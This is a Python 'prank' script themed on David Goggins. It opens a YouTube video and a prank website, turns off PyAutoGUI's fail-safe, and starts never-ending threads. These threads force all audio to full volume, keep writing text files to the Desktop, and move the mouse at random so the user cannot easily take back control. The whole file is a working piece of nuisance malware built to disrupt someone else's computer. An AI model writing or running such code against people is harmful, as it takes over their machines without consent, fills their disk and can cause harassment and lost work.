import pyautogui
import webbrowser
import random
import time
import os
import threading
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

# Disable PyAutoGUI fail-safe
pyautogui.FAILSAFE = False

# Website URL
WEBSITE_URL = "eloquent-belekoy-d08e4f.netlify.app"

# 1. THE YOUTUBE TRAP
def open_goggins():
    url = "https://www.youtube.com/watch?v=BM-Yf-DXhMM"
    webbrowser.open(url)

# 2. THE VOLUME LOCK (Forces 100% volume constantly)
def force_max_volume():
    while True:
        try:
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMasterVolume(1.0, None)
        except:
            pass
        time.sleep(1)

# 3. THE DOWNLOAD FLOOD (Creates files on desktop)
def file_flood():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    while True:
        serial = random.randint(1000, 9999)
        file_path = os.path.join(desktop, f"STAY_HARD_{serial}.txt")
        try:
            with open(file_path, "w") as f:
                f.write("WHO IS GONNA CARRY THE BOATS?! YOU DON'T KNOW ME SON!")
        except:
            pass
        time.sleep(2)

# 4. THE GLOBAL MOUSE JITTER
def mouse_jitter():
    print("Goggins has the wheel now...")
    while True:
        x_offset = random.randint(-500, 1000)
        y_offset = random.randint(-300, 2000)
        pyautogui.moveRel(x_offset, y_offset, duration=0.1)
        time.sleep(0.05)

# 5. Open prank website
def open_site():
    webbrowser.open(WEBSITE_URL)

# --- EXECUTION ---
if __name__ == "__main__":
    # Start YouTube
    open_goggins()
    
    # Open the prank website
    open_site()
    
    # Start threads
    threading.Thread(target=force_max_volume, daemon=True).start()
    threading.Thread(target=file_flood, daemon=True).start()
    threading.Thread(target=mouse_jitter, daemon=True).start()
    
    # Create a text file on desktop
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    with open(f"{desktop}/STAY_HARD_{random.randint(1,999)}.txt", "w") as f:
        f.write("YOU DON'T KNOW ME SON!")
    
    # Keep the script alive
    while True:
        time.sleep(1)
